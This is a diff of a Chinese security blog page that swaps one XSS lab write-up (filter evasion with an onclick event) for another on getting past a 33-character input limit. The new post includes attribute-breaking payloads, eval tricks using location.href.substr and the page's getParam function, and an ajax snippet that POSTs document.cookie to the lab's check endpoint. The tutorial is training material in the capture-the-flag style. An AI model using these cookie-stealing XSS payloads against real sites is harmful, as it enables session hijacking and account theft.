@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（四）跨站脚本XSS之逃逸过滤, wkai&#39;s Blog">
+    <meta name="keywords" content="（五）跨站脚本XSS之长度限制, wkai&#39;s Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（四）跨站脚本XSS之逃逸过滤 | wkai&#39;s Blog</title>
+    <title>（五）跨站脚本XSS之长度限制 | wkai&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -245,12 +245,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（四）跨站脚本XSS之逃逸过滤</h1>
+                    <h1 class="description center-align post-title">（五）跨站脚本XSS之长度限制</h1>
                 </div>
             </div>
         </div>
@@ -396,59 +396,208 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <ul>
-<li>当我们学会了打破网页结构之后，我们发现这个技巧有些情况并不适用。并不能成功的闭合标签，或者像<code>&lt;script&gt;</code>标签直接被过滤。这时候我们应该换一个思路,使用事件属性来突破。</li>
-<li>本篇靶场地址：<a href="https://tofu.exeye.run/event" target="_blank" rel="noopener">https://tofu.exeye.run/event</a></li>
+<li><p>我们平时测试总会用alert(1)去测试是否存在xss漏洞，但真到了要利用这个漏洞。执行的代码就不是alert(1)这么简单了，一些输入点具有字符长度的限制，可能测试语句alert(1)可以顺利执行，但真正的利用代码就会很长，导致无法顺利利用，本篇文章将会介绍些突破长度限制的方法。</p>
+</li>
+<li><p>靶场五    地址：<a href="https://tofu.exeye.run/limit" target="_blank" rel="noopener">https://tofu.exeye.run/limit</a></p>
+</li>
+<li><p>靶场的要求是用XSS构造一个POST请求，将自己的cookie发送到指定的URL，指定的URL会根据你发送的cookie值来决定响应内容，如果正确的话，网页将会弹出正确的flag，否则会弹出请传入正确的cookie参数</p>
+</li>
+<li><ul>
+<li>打开页面，只有一个搜索按钮可以点击，而且题目是突破长度限制，说明输入是有限制的</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(1).png" alt></p>
+</li>
+<li><ul>
+<li>尝试通过输入字符找出限制，通过输入四组1到9，发现第四组的789没有出现在记录中，所以我们最多输入的字符为33个</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png" alt></p>
+</li>
+<li><ul>
+<li>接着我们，打开控制台，找出记录在源码中的位置，看看能不能直接触发XSS，顺便看看会不会有过滤</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(6).png" alt></p>
+</li>
+<li><ul>
+<li>从上图我们可以看到，记录原原本本地出现在了标签之中，尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(7).png" alt="被过滤掉了"></p>
+</li>
+<li><ul>
+<li>但是很遗憾，<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>都被过滤掉了</li>
+<li>分析代码，发现标签的内容也是我们可以控制的，所以我们可以尝试构造onclick事件</li>
+<li>闭合log字段，构造payload：”onclick=”alert(1)”</li>
+<li>添加到记录后我们查看源代码，成功地构造了一个onclick事件</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard.png" alt></p>
+</li>
+<li><ul>
+<li>点击有onclick事件的记录，成功弹窗</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(15).png" alt></p>
+</li>
+<li><br>
+</li>
+<li><p>但是跨站脚本的目的肯定不是弹窗对吧</p>
+</li>
+<li><p>所以我们来构造个更有趣的payload</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token string">'https://tofu.exeye.run/limit_check'</span><span class="token punctuation">,</span>
+        type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>
+        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">,</span>
+        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span>
+       <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+</li>
+<li><p>这段代码可以向指定的URL发送POST请求，并且附上点击者的cookie，然后success字段的函数会把响应的内容以弹窗的形式反馈给我们</p>
+</li>
+<li><p>但是这段代码需要用eval执行，所以最终的payload为</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"onclick="</span><span class="token function">eval</span><span class="token punctuation">(</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token string">'https://tofu.exeye.run/limit_check'</span><span class="token punctuation">,</span>type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">,</span>success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>"</code></pre>
+</li>
+<li><p>上面说了，搜索框的限制为33字符，那么我们该怎么使用这么长的payload呢</p>
+</li>
 </ul>
 <br>
 
 <ul>
-<li>直接打开页面是一个输入框，右边的按钮会将输入的内容变成一个链接</li>
-</ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(2).png" alt></p>
-<ul>
-<li><p>按套路走，先看javascript的源代码，因为输入内容一般会先由js控制</p>
+<li><p>接下来我们试试第一种方法</p>
 </li>
-<li><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//定义按钮类url-btn的函数内容</span>
-            <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//获取输入框的内容</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token comment" spellcheck="true">//如果为空</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'none'</span><span class="token punctuation">)</span>   
-            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//如果不为空</span>
-                val <span class="token operator">=</span>  val<span class="token punctuation">.</span><span class="token function">toLocaleLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/script/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//这里会过滤掉&lt;>和script</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'block'</span><span class="token punctuation">)</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">'&lt;span style="padding-left: 2px">生成的链接为：&lt;a class="url" href="'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'">'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'&lt;/a>&lt;/span>'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将输入的内容变成href的value</span>
-            <span class="token punctuation">}</span>
+<li><ul>
+<li>js中location.href.substr(x)可获取浏览器地址栏中第x个字符以后的文本    </li>
+<li>比如location.href.substr(66)，就是获取url中第66个字符以后的文本</li>
+<li>不信的同学可以尝试到控制台去运行下，然后在地址栏中数数</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(12).png" alt="URL"></p>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(4).png" alt="控制台console界面"></p>
+</li>
+<li><ul>
+<li>所以我们可以尝试先将payload输入到地址栏中，因为地址栏是不会限制字符数的，输入后先在console测试多少个字符开始后是我们的payload</li>
+</ul>
+</li>
+<li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(11).png" alt></p>
+</li>
+<li><ul>
+<li>然后再构造另一部分payload：”onclick=”eval(location.href.substr(35))”</li>
+<li>但是很遗憾这段payload的长度是44个字符，还是超过了33</li>
+<li>那么只能找找网页本身的js代码，寻找是否有开发者写入的网页本身的调用参数的简单语句了</li>
+<li><br>
+</li>
+</ul>
+</li>
+<li><p>第二种方法：</p>
+<ul>
+<li><p>控制记录输出的部分js代码</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> query <span class="token operator">=</span>  <span class="token function">getParam</span><span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">''</span>             <span class="token comment" spellcheck="true">//从location.search中获取query参数的值</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            query<span class="token operator">=</span>query<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;|>|script/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//33字符限制</span>
         <span class="token punctuation">}</span>
-    <span class="token punctuation">)</span></code></pre>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        record<span class="token punctuation">.</span>record_list<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token punctuation">{</span>search<span class="token punctuation">:</span> query<span class="token punctuation">,</span> time<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'searchInfo'</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>record <span class="token operator">&amp;&amp;</span> record<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">''</span>
+            record<span class="token punctuation">.</span>record_list<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+                str <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'&lt;h4>&lt;a class="cd-nowrap"  log="'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>search<span class="token operator">+</span><span class="token string">':content">'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>search<span class="token operator">+</span><span class="token string">'&lt;/a>&lt;/h4>&lt;time datetime="2016-01-12">'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>time<span class="token operator">+</span><span class="token string">'&lt;/time>'</span>
+
+        <span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.record-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+<span class="token keyword">function</span> <span class="token function">getParam</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>             
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//如果location.search不为空</span>
+        <span class="token keyword">let</span> param <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//创建个新的对象,值为所有的参数</span>
+        <span class="token keyword">return</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>param<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">//param从参数name中取出value，然后解码</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token string">''</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
 </li>
-<li><p>分析源代码，我们输入的数据会变成链接，以及标签的内容，但是<code>&lt;script&gt;</code>会被过滤</p>
+<li><p>通过分析上述代码，我们发现函数getParam()可以取出地址栏中对应参数的值</p>
 </li>
-<li><p>如果只是过滤script这个字眼，那这里有个小技巧，可以在一个script中再插入个script，比如scrscriptipt，系统将script过滤掉后刚好面的字母又可以组成一个script</p>
+<li><p>所以我们可以构造这样一个payload：<code>&quot;onclick=&quot;eval(getParam(1))&quot;</code></p>
 </li>
-<li><p>但是偏偏还过滤了&lt;&gt;，所以这就有点难办了，无法打破网页结构</p>
+<li><p>接着在后面用&amp;附上参数1的值，也就是我们真正能发挥作用的payload</p>
+</li>
+<li><p>我们先让参数1的值为alert(‘XSS’)，不过这里已经经过URL编码</p>
 </li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(3).png" alt></p>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(3).png" alt></p>
 <ul>
-<li><p>分析源码，我们发现还有个方法，就是构造一个onclick事件让他触发js代码</p>
-</li>
-<li><p>那么怎么触发呢？</p>
-</li>
-<li><p>我们同样需要先闭合href字段，再给末尾的引号凑对</p>
-</li>
-<li><p>所以我们的最终payload为：</p>
-</li>
-<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span></code></pre>
-</li>
+<li>然后在console中调用下函数，可以看到参数1确实被赋值了</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png" alt="这样就成功构造了一个onclick事件"></p>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(14).png" alt></p>
 <ul>
-<li>点击链接成功触发弹窗</li>
+<li>点击记录，也能触发弹窗</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(1).png" alt></p>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(13).png" alt></p>
 <ul>
-<li>不过有个需要注意到的地方就是payload括号中不能用双引号，否则就不能凑成一个闭合，也就无法触发弹窗了</li>
+<li>接着我们就可以将参数1换成真正的payload拿到正确flag了</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard.png" alt></p>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(15).png" alt></p>
+<ul>
+<li>这里最后验证下，通过抓包可以看到，我们确实将自己的cookie发送过去了</li>
+</ul>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(17).png" alt></p>
+<ul>
+<li>假如你发送过去的cookie值不对，那么会提示输入正确的cookie，也无法弹出正确的flag了</li>
+</ul>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(16).png" alt="提示请传入正确的cookie参数，我的burp不能显示中文所以乱码了"></p>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(5).png" alt></p>
+<ul>
+<li>正确的flag</li>
+</ul>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(9).png" alt></p>
+</li>
+</ul>
+<br>
+
+<ul>
+<li><p>知识拓展：</p>
+<ul>
+<li><strong>location.search</strong>：地址栏中?后所有的参数值（包括问号）</li>
+</ul>
+<p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(10).png" alt></p>
+<ul>
+<li><p>js中location.href.substr(x)可获取浏览器地址栏中第x个字符以后的文本</p>
+<ul>
+<li>比如location.href.substr(66)，就是获取地址栏中第66个字符以后的文本</li>
+</ul>
+</li>
+<li><p>什么是<strong>AJAX</strong></p>
+<ul>
+<li><p>AJAX = 异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。简短地说，在不重载整个网页的情况下，AJAX 通过后台加载数据，并在网页上进行显示。</p>
+</li>
+<li><p>我们的恶意代码就是通过异步的方式，在后台对指定URL发起POST请求，然后根据响应内容弹窗</p>
+</li>
+<li><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token string">'https://tofu.exeye.run/limit_check'</span><span class="token punctuation">,</span>
+        type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>
+        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">,</span>
+        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span>
+       <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li></li>
+<li></li>
+<li></li>
+</ul>
 
             </div>
             <hr/>
@@ -474,7 +623,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/">http://wkaiblog.cn/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/</a>
+                    <a href="http://wkaiblog.cn/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/">http://wkaiblog.cn/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -681,19 +830,27 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/">
+                <a href="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png" class="responsive-img" alt="（五）跨站脚本XSS之长度限制">
+                        <img src="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/clipboard(3).png" class="responsive-img" alt="（二）跨站脚本XSS之打破网页结构">
                         
-                        <span class="card-title">（五）跨站脚本XSS之长度限制</span>
+                        <span class="card-title">（二）跨站脚本XSS之打破网页结构</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-我们平时测试总会用alert(1)去测试是否存在xss漏洞，但真到了要利用这个漏洞。执行的代码就不是alert(1)这么简单了，一些输入点具有字符长度的限制，可能测试语句alert(1)可以顺利执行，但真正的利用代码就会很长，导致无法顺利
+这个靶场主要是讲一个xss攻击技巧，当我们发现自己的输入值进入了html标签的属性值。那么我们就可以想办法打破闭合标签，造成xss。靶场地址：https://tofu.exeye.run/dom
+
+
+
+
+打开页面依旧是只有一个搜索框
+
+
+
                         
                     </div>
                     <div class="publish-info">
@@ -718,23 +875,25 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/">
+                <a href="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(5).png" class="responsive-img" alt="（一）跨站脚本XSS之基本反射型">
+                        <img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png" class="responsive-img" alt="（四）跨站脚本XSS之逃逸过滤">
                         
-                        <span class="card-title">（一）跨站脚本XSS之基本反射型</span>
+                        <span class="card-title">（四）跨站脚本XSS之逃逸过滤</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
